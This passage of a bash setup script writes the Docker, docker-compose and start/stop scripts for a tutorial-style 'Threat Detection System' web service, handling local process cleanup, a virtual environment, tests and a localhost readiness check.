
WORKDIR /app

# Install dependencies
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy application
COPY src/ ./src/
COPY config/ ./config/
COPY web/ ./web/

EXPOSE 8000

CMD ["python", "-m", "src.main"]
EOF

# Create docker-compose.yml
cat > docker-compose.yml << 'EOF'
version: '3.8'

services:
  threat-detection:
    build: .
    ports:
      - "8000:8000"
    volumes:
      - ./config:/app/config
      - ./logs:/app/logs
    environment:
      - PYTHONUNBUFFERED=1
    restart: unless-stopped
EOF

# Create .dockerignore
cat > .dockerignore << 'EOF'
__pycache__
*.pyc
*.pyo
*.pyd
.Python
venv/
.pytest_cache/
.coverage
htmlcov/
dist/
build/
*.egg-info/
EOF

# Create start.sh
cat > start.sh << 'EOF'
#!/bin/bash
set -e

# Get the directory where this script is located
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

echo "🚀 Day 157: Threat Detection System - Starting..."
echo "📂 Working directory: $SCRIPT_DIR"

# Check for duplicate services
echo "🔍 Checking for existing services..."
if pgrep -f "python.*src.main" > /dev/null; then
    echo "⚠️  Warning: API server is already running!"
    echo "   Stopping existing processes..."
    pkill -f "python.*src.main" || true
    sleep 2
fi

if pgrep -f "python.*src.data_generator" > /dev/null; then
    echo "⚠️  Warning: Data generator is already running!"
    echo "   Stopping existing processes..."
    pkill -f "python.*src.data_generator" || true
    sleep 2
fi

# Check if port 8000 is in use
if lsof -Pi :8000 -sTCP:LISTEN -t >/dev/null 2>&1 ; then
    echo "⚠️  Warning: Port 8000 is already in use!"
    echo "   Attempting to free the port..."
    lsof -ti:8000 | xargs kill -9 2>/dev/null || true
    sleep 2
fi

# Create virtual environment
if [ ! -d "venv" ]; then
    echo "📦 Creating virtual environment..."
    python3.11 -m venv venv || python3 -m venv venv
fi

# Activate virtual environment
source venv/bin/activate

# Install dependencies
echo "📥 Installing dependencies..."
pip install --upgrade pip > /dev/null 2>&1
pip install -r requirements.txt > /dev/null 2>&1

# Run tests
echo "🧪 Running tests..."
python -m pytest tests/ -v --tb=short || echo "⚠️  Some tests failed, continuing..."

# Start API server in background
echo "🌐 Starting API server..."
cd "$SCRIPT_DIR"
python -m src.main > logs/api.log 2>&1 &
API_PID=$!

# Wait for server to start
echo "⏳ Waiting for server to start..."
for i in {1..10}; do
    if curl -s http://localhost:8000/api/stats > /dev/null 2>&1; then
        echo "✅ Server is ready!"
        break
    fi
    sleep 1
done

# Open dashboard
echo "📊 Dashboard available at: http://localhost:8000/dashboard"

# Generate test traffic
echo "🎭 Generating test traffic..."
cd "$SCRIPT_DIR"
python -m src.data_generator > logs/traffic.log 2>&1 &
TRAFFIC_PID=$!

echo ""
echo "✅ System running successfully!"
echo ""
echo "📍 Endpoints:"
echo "   Dashboard: http://localhost:8000/dashboard"
echo "   API Stats: http://localhost:8000/api/stats"
echo "   WebSocket: ws://localhost:8000/ws/threats"
echo ""
echo "📝 Logs:"
echo "   API: logs/api.log"
echo "   Traffic: logs/traffic.log"
echo ""
echo "Press Ctrl+C to stop..."

# Function to cleanup on exit
cleanup() {
    echo ""
    echo "🛑 Stopping services..."
    kill $API_PID 2>/dev/null || true
    kill $TRAFFIC_PID 2>/dev/null || true
    pkill -f "python.*src.main" || true
    pkill -f "python.*src.data_generator" || true
    echo "✅ Stopped"
    exit 0
}

trap cleanup SIGINT SIGTERM

# Wait for interrupt
wait $API_PID
EOF

chmod +x start.sh

# Create stop.sh
cat > stop.sh << 'EOF'
#!/bin/bash

echo "🛑 Stopping Threat Detection System..."

# Kill processes
pkill -f "python -m src.main" || true
pkill -f "python -m src.data_generator" || true

# Deactivate virtual environment
deactivate 2>/dev/null || true

echo "✅ Stopped"
EOF

chmod +x stop.sh

# Create __init__.py files for Python packages
touch src/__init__.py
touch src/engine/__init__.py
touch src/rules/__init__.py
touch src/api/__init__.py
touch tests/__init__.py
touch tests/unit/__init__.py
touch tests/integration/__init__.py

echo ""
echo "✅ Project structure created successfully!"
echo ""
echo "📁 Directory structure:"
tree -L 2 -I 'venv|__pycache__|*.pyc' . || ls -la

echo ""
echo "🔧 Next steps:"
echo "   1. Run: ./start.sh"
echo "   2. Open browser: http://localhost:8000/dashboard"
echo "   3. Watch real-time threat detection"
echo "   4. Stop with: ./stop.sh"
echo ""
echo "🐳 Docker deployment:"
echo "   docker-compose up --build"
echo ""